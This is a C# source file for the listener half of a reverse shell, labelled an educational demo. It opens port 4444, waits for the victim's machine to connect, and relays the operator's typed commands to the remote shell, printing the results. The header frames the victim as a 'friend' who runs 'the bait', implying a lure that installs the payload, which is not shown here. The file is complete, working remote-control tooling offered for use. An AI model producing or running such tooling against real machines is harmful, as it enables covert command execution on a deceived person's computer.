// ============================================================
//  LISTENER (your machine) — Educational Reverse Shell Demo
//  Run this FIRST on YOUR computer before your
//  friend runs the bait.
//
//  Usage: dotnet script rs_listener.cs
//         (or compile as a .NET project with dotnet run)
//  To close: Ctrl+C in this terminal
// ============================================================

using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

const int PORT = 4444;
var closing = 0;

void Shutdown(TcpListener srv, TcpClient client, string reason = "")
{
    if (Interlocked.Exchange(ref closing, 1) == 1) return;

    if (reason.Length > 0)
    {
        Console.WriteLine($"\n\x1b[31m{reason}\x1b[0m");
        Console.WriteLine("\x1b[31m[-] Closing connection.\x1b[0m");
    }
    else
    {
        Console.WriteLine("\n\x1b[31m[-] Closing connection.\x1b[0m");
    }

    try { client?.Close(); } catch { }
    try { srv.Stop(); } catch { }

    Console.WriteLine("\x1b[31m[*] Listener closed.\x1b[0m");
    Console.Out.Flush();
    Environment.Exit(0);
}

// --- Start server ------------------------------------------------------------
var server = new TcpListener(IPAddress.Any, PORT);
server.Server.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);

try { server.Start(); }
catch (SocketException)
{
    Console.WriteLine($"\x1b[31m[!] Port {PORT} is already in use. Close the process that is using it.\x1b[0m");
    Environment.Exit(1);
}

Console.WriteLine("\x1b[36m\u2554" + new string('\u2550', 40) + "\u2557");
Console.WriteLine("\u2551  REVERSE SHELL LISTENER \u2014 Demo         \u2551");
Console.WriteLine("\u255a" + new string('\u2550', 40) + "\u255d\x1b[0m");
Console.WriteLine($"\x1b[33m[*] Listening on port {PORT}...");
Console.WriteLine("[*] Waiting for client to connect...\x1b[0m");
Console.WriteLine();
string targetIp = null;
int? targetPort = null;
try
{
    string lastTarget = Path.Combine(Directory.GetCurrentDirectory(), ".last_target");
    if (File.Exists(lastTarget))
    {
        string[] lines = File.ReadAllText(lastTarget).Trim().Split('\n');
        if (lines.Length >= 2)
        {
            targetIp = lines[0].Trim();
            if (int.TryParse(lines[1].Trim(), out int p)) targetPort = p;
        }
    }
}
catch { }
Console.WriteLine("Connection:");
try
{
    using var udp = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
    udp.Connect("8.8.8.8", 80);
    string ipLocal = ((IPEndPoint)udp.LocalEndPoint!).Address.ToString();
    Console.WriteLine($"  \x1b[32mLocal IP : {ipLocal}\x1b[0m");
    if (targetIp != null && targetIp != ipLocal && targetIp != "127.0.0.1" && targetIp != "localhost")
    {
        string ps = targetPort.HasValue ? $":{targetPort}" : "";
        Console.WriteLine($"  \x1b[32mTunnel   : {targetIp}{ps} \u2192 {ipLocal}:{PORT}\x1b[0m");
    }
    else
    {
        Console.WriteLine($"  \x1b[32mListener : {ipLocal}:{PORT}\x1b[0m");
    }
}
catch
{
    Console.WriteLine("  \x1b[31mNo network connection\x1b[0m");
}
Console.WriteLine();

// --- Ctrl+C ------------------------------------------------------------------
TcpClient currentClient = null;

Console.CancelKeyPress += (_, e) =>
{
    e.Cancel = true;
    Shutdown(server, currentClient);
};

// --- Wait for connection (with timeout so Ctrl+C works) ----------------------
TcpClient client = null;
while (client == null)
{
    if (server.Pending())
    {
        client = server.AcceptTcpClient();
    }
    else
    {
        Thread.Sleep(500);
    }
}
currentClient = client;

var stream = client.GetStream();
var remoteEP = (IPEndPoint)client.Client.RemoteEndPoint!;

Console.WriteLine($"\x1b[32m[+] Connection received from: {remoteEP.Address}\x1b[0m");
Console.WriteLine("\x1b[33m[!] You can now type commands. Type exit to close.\x1b[0m");
Console.WriteLine(new string('\u2500', 50));

// --- Receive thread (remote shell output -> screen) --------------------------
var recvThread = new Thread(() =>
{
    var buf = new byte[4096];
    var decoder = Encoding.UTF8.GetDecoder();
    var chars = new char[4096];
    while (true)
    {
        try
        {
            int n = stream.Read(buf, 0, buf.Length);
            if (n == 0)
            {
                Shutdown(server, client, "[-] Connection closed by the client.");
                return;
            }
            int charCount = decoder.GetChars(buf, 0, n, chars, 0);
            Console.Write(chars, 0, charCount);
        }
        catch (IOException)
        {
            Shutdown(server, client, "[-] Connection closed by the client.");
            return;
        }
        catch (ObjectDisposedException) { return; }
    }
})
{ IsBackground = true };
recvThread.Start();

// --- Main thread: keyboard -> remote shell -----------------------------------
try
{
    while (true)
    {
        string cmd = Console.ReadLine()!;
        byte[] data = Encoding.UTF8.GetBytes(cmd + "\n");
        stream.Write(data, 0, data.Length);
        stream.Flush();
        if (cmd.Trim().ToLower() == "exit")
        {
            recvThread.Join(2000);
            Shutdown(server, client);
            break;
        }
    }
}
catch (IOException)
{
    Shutdown(server, client, "[-] Connection closed by the client.");
}
catch (Exception)
{
    Shutdown(server, client);
}
